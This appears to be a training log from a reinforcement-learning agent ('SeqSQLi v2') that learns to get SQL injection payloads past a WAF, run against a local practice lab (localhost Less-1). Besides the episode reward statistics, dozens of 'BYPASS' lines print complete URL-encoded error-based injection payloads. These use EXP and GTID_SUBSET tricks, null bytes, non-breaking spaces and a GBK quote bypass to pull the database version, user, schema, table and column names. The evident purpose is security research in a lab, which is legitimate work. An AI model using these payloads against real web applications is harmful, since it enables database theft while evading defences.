/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  Ep 3420 | SR=0% | Steps=15.0 | R=-37.09
  Ep 3430 | SR=0% | Steps=15.0 | R=-36.94
  Ep 3440 | SR=0% | Steps=15.0 | R=-38.20
  Ep 3450 | SR=0% | Steps=15.0 | R=-37.43
  Ep 3460 | SR=0% | Steps=15.0 | R=-38.36
  Ep 3470 | SR=0% | Steps=15.0 | R=-37.58
  Ep 3480 | SR=0% | Steps=15.0 | R=-37.45
  Ep 3490 | SR=0% | Steps=15.0 | R=-38.27
  Ep 3500 | SR=0% | Steps=15.0 | R=-37.38
  [BYPASS] Ep 3505 | steps=7 | seq=case -> tab_space -> case -> func_sp_nbsp -> case -> case -> null_byte
           payload: 1'%09AnD%09GTID_SUBSET((DatabAsE%a0()),1);%00
  Ep 3510 | SR=10% | Steps=14.2 | R=-33.87
  [BYPASS] Ep 3515 | steps=12 | seq=hex_to_char -> func_sp_nl -> case -> char_split -> null_byte -> hex_to_char -> hex_to_char -> func_sp_nbsp -> case -> null_byte -> agg_swap -> newline
           payload: 1'%0aAND%0aEXP(~(sElECt%0a*%0afROm%0a(SeLECt%0a((sElECt%0aJSON_ARRAYAGG(CONCAT(tAbLe_schema,CHAR(46),TABLe_name))%0aFrom%0aInfoRMAtION_SChEmA.TaBLEs%0
  Ep 3520 | SR=10% | Steps=14.7 | R=-37.04
  Ep 3530 | SR=0% | Steps=15.0 | R=-39.08
  Ep 3540 | SR=0% | Steps=15.0 | R=-38.34
  Ep 3550 | SR=0% | Steps=15.0 | R=-38.01
  Ep 3560 | SR=0% | Steps=15.0 | R=-37.45
  Ep 3570 | SR=0% | Steps=15.0 | R=-38.50
  Ep 3580 | SR=0% | Steps=15.0 | R=-36.97
  Ep 3590 | SR=0% | Steps=15.0 | R=-36.82
  Ep 3600 | SR=0% | Steps=15.0 | R=-38.98
  Ep 3610 | SR=0% | Steps=15.0 | R=-36.97
  Ep 3620 | SR=0% | Steps=15.0 | R=-37.35
  [BYPASS] Ep 3623 | steps=10 | seq=case -> null_byte -> newline -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SELECt%0a*%0afrOM%0a(selECT%0a((sEleCt%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aiNfOrmaTioN_scHEma.schemata)))a));%00
  Ep 3630 | SR=10% | Steps=14.5 | R=-34.44
  Ep 3640 | SR=0% | Steps=15.0 | R=-37.43
  Ep 3650 | SR=0% | Steps=15.0 | R=-37.90
  [BYPASS] Ep 3654 | steps=13 | seq=agg_swap -> case -> newline -> case -> case -> gbk_bypass -> newline -> case -> case -> case -> case -> case -> null_byte
           payload: 1%bf%27%0aanD%0aEXP(~(SeleCT%0a*%0aFrOm%0a(SeLecT%0a((SElECT%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aiNforMATioN_ScheMa.schemata)))a));%00
  Ep 3660 | SR=10% | Steps=14.8 | R=-36.39
  Ep 3670 | SR=0% | Steps=15.0 | R=-38.45
  Ep 3680 | SR=0% | Steps=15.0 | R=-38.43
  Ep 3690 | SR=0% | Steps=15.0 | R=-36.01
  Ep 3700 | SR=0% | Steps=15.0 | R=-36.98
  Ep 3710 | SR=0% | Steps=15.0 | R=-37.94
  [BYPASS] Ep 3719 | steps=5 | seq=hex_to_char -> agg_swap -> newline -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(seLEcT%0a*%0aFROm%0a(sELEct%0a((sElECT%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aINfORmATiON_schemA.schemata)))a));%00  *** NEW SHORTEST ***
  Ep 3720 | SR=10% | Steps=14.0 | R=-32.43
  Ep 3730 | SR=0% | Steps=15.0 | R=-37.78
  Ep 3740 | SR=0% | Steps=15.0 | R=-37.31
  Ep 3750 | SR=0% | Steps=15.0 | R=-37.70
  Ep 3760 | SR=0% | Steps=15.0 | R=-37.36
  Ep 3770 | SR=0% | Steps=15.0 | R=-37.24
  Ep 3780 | SR=0% | Steps=15.0 | R=-38.28
  Ep 3790 | SR=0% | Steps=15.0 | R=-36.95
  Ep 3800 | SR=0% | Steps=15.0 | R=-36.83
  Ep 3810 | SR=0% | Steps=15.0 | R=-38.32
  Ep 3820 | SR=0% | Steps=15.0 | R=-37.69
  Ep 3830 | SR=0% | Steps=15.0 | R=-36.30
  Ep 3840 | SR=0% | Steps=15.0 | R=-37.78
  Ep 3850 | SR=0% | Steps=15.0 | R=-36.48
  Ep 3860 | SR=0% | Steps=15.0 | R=-36.98
  Ep 3870 | SR=0% | Steps=15.0 | R=-36.73
  Ep 3880 | SR=0% | Steps=15.0 | R=-37.33
  Ep 3890 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3900 | SR=0% | Steps=15.0 | R=-35.59
  Ep 3910 | SR=0% | Steps=15.0 | R=-37.08
  Ep 3920 | SR=0% | Steps=15.0 | R=-37.62
  Ep 3930 | SR=0% | Steps=15.0 | R=-38.33
  Ep 3940 | SR=0% | Steps=15.0 | R=-36.47
  Ep 3950 | SR=0% | Steps=15.0 | R=-37.32
  Ep 3960 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3970 | SR=0% | Steps=15.0 | R=-37.81
  Ep 3980 | SR=0% | Steps=15.0 | R=-36.80
  Ep 3990 | SR=0% | Steps=15.0 | R=-37.26
  Ep 4000 | SR=0% | Steps=15.0 | R=-36.82
  Ep 4010 | SR=0% | Steps=15.0 | R=-37.00
  Ep 4020 | SR=0% | Steps=15.0 | R=-37.89
  Ep 4030 | SR=0% | Steps=15.0 | R=-38.57
  Ep 4040 | SR=0% | Steps=15.0 | R=-38.68
  Ep 4050 | SR=0% | Steps=15.0 | R=-37.59
  Ep 4060 | SR=0% | Steps=15.0 | R=-37.16
  Ep 4070 | SR=0% | Steps=15.0 | R=-36.52
  Ep 4080 | SR=0% | Steps=15.0 | R=-37.18
  Ep 4090 | SR=0% | Steps=15.0 | R=-37.54
  Ep 4100 | SR=0% | Steps=15.0 | R=-37.32
  Ep 4110 | SR=0% | Steps=15.0 | R=-36.95
  Ep 4120 | SR=0% | Steps=15.0 | R=-36.86
  [BYPASS] Ep 4126 | steps=15 | seq=newline -> null_byte -> hex_to_char -> null_byte -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aAND%0aEXP(~(sELEct%0a*%0aFrOm%0a(SElECT%0a((SeLeCt%0aJSON_ARRAYAGG(schema_name)%0aFrom%0aInFoRmatiON_schema.schemata)))a));%00
  Ep 4130 | SR=10% | Steps=15.0 | R=-35.30
  Ep 4140 | SR=0% | Steps=15.0 | R=-37.20
  Ep 4150 | SR=0% | Steps=15.0 | R=-37.96
  Ep 4160 | SR=0% | Steps=15.0 | R=-35.82
  Ep 4170 | SR=0% | Steps=15.0 | R=-37.95
  Ep 4180 | SR=0% | Steps=15.0 | R=-37.48
  Ep 4190 | SR=0% | Steps=15.0 | R=-37.79
  Ep 4200 | SR=0% | Steps=15.0 | R=-37.90
  Ep 4210 | SR=0% | Steps=15.0 | R=-37.67
  Ep 4220 | SR=0% | Steps=15.0 | R=-37.81
  Ep 4230 | SR=0% | Steps=15.0 | R=-36.94
  Ep 4240 | SR=0% | Steps=15.0 | R=-36.42
  Ep 4250 | SR=0% | Steps=15.0 | R=-37.00
  Ep 4260 | SR=0% | Steps=15.0 | R=-37.08
  Ep 4270 | SR=0% | Steps=15.0 | R=-36.36
  Ep 4280 | SR=0% | Steps=15.0 | R=-36.96
  Ep 4290 | SR=0% | Steps=15.0 | R=-37.01
  Ep 4300 | SR=0% | Steps=15.0 | R=-34.70
  Ep 4310 | SR=0% | Steps=15.0 | R=-37.12
  Ep 4320 | SR=0% | Steps=15.0 | R=-38.37
  Ep 4330 | SR=0% | Steps=15.0 | R=-37.94
  Ep 4340 | SR=0% | Steps=15.0 | R=-37.24
  Ep 4350 | SR=0% | Steps=15.0 | R=-36.29
  Ep 4360 | SR=0% | Steps=15.0 | R=-37.56
  Ep 4370 | SR=0% | Steps=15.0 | R=-37.37
  Ep 4380 | SR=0% | Steps=15.0 | R=-37.95
  Ep 4390 | SR=0% | Steps=15.0 | R=-37.39
  Ep 4400 | SR=0% | Steps=15.0 | R=-36.76
  [BYPASS] Ep 4407 | steps=9 | seq=double_or -> agg_swap -> agg_swap -> hex_to_char -> crlf -> null_byte -> null_byte -> null_byte -> case
           payload: 1'%0d%0aAND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afrom%0d%0a(SeLECt%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINFormaTiON_SChema.schemata))
  Ep 4410 | SR=10% | Steps=14.4 | R=-35.05
  Ep 4420 | SR=0% | Steps=15.0 | R=-37.08
  Ep 4430 | SR=0% | Steps=15.0 | R=-37.71
  Ep 4440 | SR=0% | Steps=15.0 | R=-37.54
  Ep 4450 | SR=0% | Steps=15.0 | R=-36.86
  Ep 4460 | SR=0% | Steps=15.0 | R=-38.39
  Ep 4470 | SR=0% | Steps=15.0 | R=-37.37
  Ep 4480 | SR=0% | Steps=15.0 | R=-35.40
  Ep 4490 | SR=0% | Steps=15.0 | R=-36.41
  Ep 4500 | SR=0% | Steps=15.0 | R=-37.00
  Ep 4510 | SR=0% | Steps=15.0 | R=-36.52
  Ep 4520 | SR=0% | Steps=15.0 | R=-36.77
  Ep 4530 | SR=0% | Steps=15.0 | R=-37.35
  [BYPASS] Ep 4533 | steps=15 | seq=newline -> case -> ver_urlenc -> null_byte -> case -> case -> case -> newline -> null_byte -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(sELecT%0a*%0afROm%0a(SELEct%0a((SElEcT%0aJSON_ARRAYAGG(schema_name)%0afROM%0aiNFORMATioN_SChEma.schemata)))a));%00
  Ep 4540 | SR=10% | Steps=15.0 | R=-35.45
  Ep 4550 | SR=0% | Steps=15.0 | R=-36.72
  Ep 4560 | SR=0% | Steps=15.0 | R=-36.61
  Ep 4570 | SR=0% | Steps=15.0 | R=-36.42
  Ep 4580 | SR=0% | Steps=15.0 | R=-36.89
  Ep 4590 | SR=0% | Steps=15.0 | R=-35.80
  [BYPASS] Ep 4600 | steps=6 | seq=newline -> agg_swap -> newline -> null_byte -> func_sp_tab -> case
           payload: 1'%0aaND%0aEXP(~(SeLect%0a*%0afRoM%0a(seLeCt%0a((SEleCt%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aiNfOrMAtION_SCheMA.schemata)))a));%00
  Ep 4600 | SR=10% | Steps=14.1 | R=-34.25
  [BYPASS] Ep 4609 | steps=4 | seq=newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SElecT%0a*%0aFROM%0a(sELeCT%0a(version%a0()))a));%00  *** NEW SHORTEST ***
  Ep 4610 | SR=10% | Steps=13.9 | R=-32.59
  [BYPASS] Ep 4614 | steps=6 | seq=newline -> null_byte -> case -> newline -> null_byte -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(sELeCT%0a*%0aFRoM%0a(SElECT%0a((SelECT%0aJSON_ARRAYAGG(schema_name)%0aFrom%0aiNFOrmATioN_SChema.schemata)))a));%00
  [BYPASS] Ep 4620 | steps=8 | seq=newline -> hex_to_char -> agg_swap -> newline -> agg_swap -> func_sp_tab -> case -> null_byte
           payload: 1'%0aaND%0aEXP(~(sELECt%0a*%0aFrOM%0a(SeLECT%0a((seLEcT%0aJSON_ARRAYAGG(COnCaT(tAbLE_schema,CHAR(46),tablE_name))%0afrOm%0aINfoRMAtIOn_SCHeMA.tAblEs%0
  Ep 4620 | SR=20% | Steps=13.4 | R=-31.60
  Ep 4630 | SR=0% | Steps=15.0 | R=-36.80
  Ep 4640 | SR=0% | Steps=15.0 | R=-37.77
  Ep 4650 | SR=0% | Steps=15.0 | R=-38.62
  [BYPASS] Ep 4652 | steps=8 | seq=hex_to_char -> agg_swap -> newline -> null_byte -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElEcT%0a*%0afrOM%0a(SeLecT%0a((SElECT%0aCOnCaT(CHAR(124),JSON_ARRAYAGG(TABLE_name),CHAR(124))%0aFROm%0aiNforMATiOn_SCHeMA.tabLes%0aW
  Ep 4660 | SR=10% | Steps=14.3 | R=-34.74
  Ep 4670 | SR=0% | Steps=15.0 | R=-37.53
  Ep 4680 | SR=0% | Steps=15.0 | R=-38.04
  [BYPASS] Ep 4682 | steps=6 | seq=newline -> func_sp_nbsp -> case_split -> null_byte -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sElecT%0a*%0aFROM%0a(SELect%0a(dATabASe%a0()))a));%00
  [BYPASS] Ep 4684 | steps=10 | seq=newline -> dot_prefix -> func_sp_nbsp -> case -> newline -> case -> case -> case -> case -> null_byte
           payload: .11'%0aanD%0aEXP(~(SeLEct%0a*%0afRom%0a(SeLeCT%0a(user%a0()))a));%00
  Ep 4690 | SR=20% | Steps=13.6 | R=-31.39
  Ep 4700 | SR=0% | Steps=15.0 | R=-40.30
  Ep 4710 | SR=0% | Steps=15.0 | R=-39.76
  [BYPASS] Ep 4720 | steps=6 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(sEleCT%0a*%0afrOm%0a(seLeCt%0a((SeLecT%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aiNFORMaTioN_scHeMA.schemata)))a));%00
  Ep 4720 | SR=10% | Steps=14.1 | R=-35.37
  Ep 4730 | SR=0% | Steps=15.0 | R=-38.71
  [BYPASS] Ep 4737 | steps=4 | seq=null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sElEcT%0a*%0aFrOm%0a(selecT%0a(user%a0()))a));%00
  [BYPASS] Ep 4739 | steps=8 | seq=newline -> func_sp_nbsp -> func_sp_tab -> null_byte -> func_sp_ff -> crlf -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(sElecT%0a*%0aFRoM%0a(SeLeCt%0a((sEleCT%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aInfoRmatION_SchEMA.schemata)))a));%00
  Ep 4740 | SR=20% | Steps=13.2 | R=-30.92
  Ep 4750 | SR=0% | Steps=15.0 | R=-36.89
  Ep 4760 | SR=0% | Steps=15.0 | R=-38.36
  [BYPASS] Ep 4764 | steps=8 | seq=newline -> func_sp_nbsp -> newline -> agg_swap -> func_sp_tab -> gbk_bypass -> null_byte -> case
           payload: 1%bf%27%0aanD%0aEXP(~(SElECT%0a*%0aFroM%0a(sELEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 4770 | steps=8 | seq=newline -> null_byte -> newline -> agg_swap -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SELeCt%0a*%0afRom%0a(SELEct%0a(dATABase%a0()))a));%00
  Ep 4770 | SR=20% | Steps=13.6 | R=-31.99
  Ep 4780 | SR=0% | Steps=15.0 | R=-38.16
  [BYPASS] Ep 4789 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> case -> case -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAND%0aEXP(~(SeleCt%0a*%0aFrOM%0a(SelecT%0a((sELeCt%0aJSON_ARRAYAGG(column_name)%0aFROM%0ainFoRMatiOn_sCHEMA.columns%0aWHERe%0aTAble_schema=DaTaBA
  Ep 4790 | SR=10% | Steps=14.3 | R=-34.23
  [BYPASS] Ep 4792 | steps=6 | seq=func_sp_nbsp -> newline -> func_sp_tab -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SeleCT%0a*%0aFRoM%0a(seLECT%0a(version%a0()))a));%00
  Ep 4800 | SR=10% | Steps=14.1 | R=-32.75
  [BYPASS] Ep 4805 | steps=6 | seq=null_byte -> newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SElEcT%0a*%0afrom%0a(selECT%0a(DatabAsE%a0()))a));%00
  [BYPASS] Ep 4806 | steps=9 | seq=newline -> null_byte -> func_sp_tab -> case -> hex_to_char -> concat_char -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(SELEct%0a*%0afROm%0a(SElECt%0a((sElECt%0aJSON_ARRAYAGG(schema_name)%0aFROM%0aInfOrMatIon_sChema.schemata)))a));%00
  Ep 4810 | SR=20% | Steps=13.5 | R=-32.23
  [BYPASS] Ep 4814 | steps=4 | seq=func_sp_nbsp -> crlf -> null_byte -> case
           payload: 1'%0d%0aanD%0d%0aEXP(~(SELEcT%0d%0a*%0d%0afrOM%0d%0a(selEcT%0d%0a(version%a0()))a));%00
  [BYPASS] Ep 4817 | steps=6 | seq=newline -> null_byte -> newline -> case -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SElect%0a*%0aFRoM%0a(SeLEcT%0a(version%a0()))a));%00
  Ep 4820 | SR=20% | Steps=13.0 | R=-28.02
  [BYPASS] Ep 4826 | steps=5 | seq=newline -> null_byte -> case -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELEct%0a*%0aFRoM%0a(SelEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 4827 | steps=13 | seq=hex_to_char -> agg_swap -> newline -> formfeed -> func_sp_nbsp -> case -> case -> func_sp_ff -> func_sp_tab -> case -> case -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(SElect%0a*%0aFROm%0a(seLect%0a((seLECT%0aConCAT(CHAR(124),JSON_ARRAYAGG(tABlE_name),CHAR(124))%0afROM%0aiNfORMatiOn_SCheMa.Tables%0aW
  Ep 4830 | SR=20% | Steps=13.8 | R=-31.63
  [BYPASS] Ep 4832 | steps=10 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> case -> case -> null_byte
           payload: 1'%0aand%0aEXP(~(seleCT%0a*%0aFrOm%0a(SElECT%0a((SeLecT%0aConCAT(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0aFroM%0aINfoRmatIOn_sCHEmA.TAbLes%0aW
  Ep 4840 | SR=10% | Steps=14.5 | R=-33.84
  [BYPASS] Ep 4844 | steps=6 | seq=case_split -> case_split -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(SELeCt%0a*%0aFRom%0a(SeleCT%0a(dataBASE%a0()))a));%00
  Ep 4850 | SR=10% | Steps=14.1 | R=-35.00
  [BYPASS] Ep 4860 | steps=7 | seq=hex_to_char -> func_sp_nbsp -> case -> newline -> null_byte -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(SELEcT%0a*%0aFROm%0a(SelECT%0a((seLEcT%0aJSON_ARRAYAGG(CONCAT(tABLE_schema,CHAR(46),taBle_name))%0aFrom%0aInFORMAtIoN_sCHeMa.tABlEs%0
  Ep 4860 | SR=10% | Steps=14.2 | R=-34.79
  [BYPASS] Ep 4870 | steps=12 | seq=null_byte -> between_space -> null_byte -> newline -> case -> case -> case -> newline -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%a0AND%a0GTID_SUBSET((user%a0()),1);%00
  Ep 4870 | SR=10% | Steps=14.7 | R=-36.79
  [BYPASS] Ep 4871 | steps=7 | seq=newline -> null_byte -> case -> formfeed -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SElEcT%0a*%0aFroM%0a(sELeCT%0a((seLECT%0aJSON_ARRAYAGG(column_name)%0aFRom%0ainFORMATIoN_SChEMa.columns%0awHEre%0aTAbLE_schema=datABa
  [BYPASS] Ep 4872 | steps=5 | seq=func_sp_nbsp -> case -> agg_swap -> newline -> null_byte
           payload: 1'%0aAND%0aEXP(~(SelECT%0a*%0aFRom%0a(seLeCt%0a(DaTABase%a0()))a));%00
  Ep 4880 | SR=20% | Steps=13.2 | R=-30.09
  Ep 4890 | SR=0% | Steps=15.0 | R=-37.05
  Ep 4900 | SR=0% | Steps=15.0 | R=-37.28
  Ep 4910 | SR=0% | Steps=15.0 | R=-35.86
  [BYPASS] Ep 4913 | steps=6 | seq=agg_swap -> paren_full -> newline -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aaND%0aEXP(~(SELeCT%0a*%0afROm%0a(sElEct%0a(version%a0()))a));%00
  Ep 4920 | SR=10% | Steps=14.1 | R=-32.88
  Ep 4930 | SR=0% | Steps=15.0 | R=-33.60
  [BYPASS] Ep 4940 | steps=8 | seq=agg_swap -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(SElECt%0a*%0aFROm%0a(seLeCT%0a(version%a0()))a));%00
  Ep 4940 | SR=10% | Steps=14.3 | R=-32.96
  [BYPASS] Ep 4943 | steps=6 | seq=func_sp_nbsp -> agg_swap -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(SELEct%0a*%0aFRom%0a(selEct%0a((SELECt%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aInfOrMation_schEmA.schemata)))a));%00
  [BYPASS] Ep 4946 | steps=8 | seq=func_sp_tab -> func_sp_nbsp -> hex_to_char -> null_byte -> agg_swap -> formfeed -> agg_swap -> case
           payload: 1'%0cAnD%0cEXP(~(SelecT%0c*%0cFROm%0c(SeLect%0c((SElecT%0cJSON_ARRAYAGG(CoNCAT(tAbLE_schema,CHAR(46),tablE_name))%0cFrOm%0cInformaTION_SchEma.TabLEs%0
  Ep 4950 | SR=20% | Steps=13.4 | R=-30.24
  [BYPASS] Ep 4954 | steps=6 | seq=nested_union -> func_sp_nbsp -> func_sp_nbsp -> case -> newline -> null_byte
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 4956 | steps=9 | seq=hex_to_char -> func_sp_nbsp -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SeLeCT%0a*%0aFrOM%0a(SelEct%0a((SELEcT%0aJSON_ARRAYAGG(concaT(tABle_schema,CHAR(46),tAblE_name))%0afrom%0aiNFOrMATioN_SCHEma.TabLes%0
  Ep 4960 | SR=20% | Steps=13.5 | R=-29.96
  [BYPASS] Ep 4970 | steps=9 | seq=null_byte -> hex_to_char -> agg_swap -> newline -> null_byte -> case -> agg_swap -> null_byte -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLEcT%0a*%0afROm%0a(sElect%0a((sElecT%0acONCaT(CHAR(124),JSON_ARRAYAGG(TABle_name),CHAR(124))%0aFRom%0ainforMaTIoN_sCHema.TabLes%0aw
  Ep 4970 | SR=10% | Steps=14.4 | R=-35.38
  [BYPASS] Ep 4973 | steps=6 | seq=crlf -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelecT%0d%0a*%0d%0aFRoM%0d%0a(sElEcT%0d%0a((sElECt%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFrom%0d%0aInFoRmATion_SCHema.columns%0d
  [BYPASS] Ep 4980 | steps=9 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(selEct%0a*%0aFrOm%0a(SelEct%0a(version%a0()))a));%00
  Ep 4980 | SR=20% | Steps=13.5 | R=-32.45
  [BYPASS] Ep 4984 | steps=9 | seq=agg_swap -> between_space -> agg_swap -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> newline -> null_byte
           payload: 1'%a0AnD%a0EXP(~(selECt%a0*%a0From%a0(SeleCt%a0(version%a0()))a));%00
  [BYPASS] Ep 4986 | steps=9 | seq=agg_swap -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> case -> case -> null_byte
           payload: 1'%0aAND%0aEXP(~(SeleCt%0a*%0aFROM%0a(selECT%0a(dATaBASE%a0()))a));%00
  [BYPASS] Ep 4987 | steps=13 | seq=hex_to_char -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> case -> case -> case -> case -> agg_swap -> case -> null_byte
           payload: 1'%0aanD%0aEXP(~(SelecT%0a*%0aFRoM%0a(seLEct%0a((SeLEcT%0acOnCaT(CHAR(124),JSON_ARRAYAGG(TaBlE_name),CHAR(124))%0afRoM%0aINForMaTion_schEMA.tABlEs%0aW
  [BYPASS] Ep 4990 | steps=7 | seq=func_sp_nbsp -> case -> case -> case -> func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  Ep 4990 | SR=40% | Steps=12.8 | R=-26.67
  [BYPASS] Ep 4995 | steps=5 | seq=formfeed -> func_sp_nbsp -> case -> newline -> null_byte
           payload: 1'%0cAND%0cEXP(~(SeLECT%0c*%0cFroM%0c(sELEct%0c(user%a0()))a));%00
  [BYPASS] Ep 4997 | steps=5 | seq=agg_swap -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(seLect%0a*%0aFroM%0a(SelEcT%0a(database%a0()))a));%00
  Ep 5000 | SR=20% | Steps=13.0 | R=-30.28
  [BYPASS] Ep 5003 | steps=3 | seq=func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00  *** NEW SHORTEST ***
  [BYPASS] Ep 5007 | steps=11 | seq=agg_swap -> hex_to_char -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> newline -> null_byte -> null_byte -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(selEcT%0a*%0aFRom%0a(SeLeCt%0a((sELEcT%0aCOnCaT(CHAR(124),JSON_ARRAYAGG(Table_name),CHAR(124))%0aFrOM%0aInfOrMATion_ScHemA.TAbles%0aW
  Ep 5010 | SR=20% | Steps=13.4 | R=-30.49
  [BYPASS] Ep 5018 | steps=9 | seq=hex_to_char -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(sELeCT%0a*%0afrOm%0a(sElEcT%0a((SeLEct%0aconCaT(CHAR(124),JSON_ARRAYAGG(tABle_name),CHAR(124))%0aFROm%0aiNformAtIon_ScHeMA.tABLEs%0aW
  Ep 5020 | SR=10% | Steps=14.4 | R=-35.98
  [BYPASS] Ep 5030 | steps=15 | seq=dot_prefix -> null_byte -> newline -> null_byte -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: .11'%0aaND%0aEXP(~(sElect%0a*%0afroM%0a(SElecT%0a((selECT%0aJSON_ARRAYAGG(tabLE_name)%0aFROm%0aINFoRmAtIOn_scHema.tABLes%0aWhErE%0atABle_schema=datABa
  Ep 5030 | SR=10% | Steps=15.0 | R=-35.11
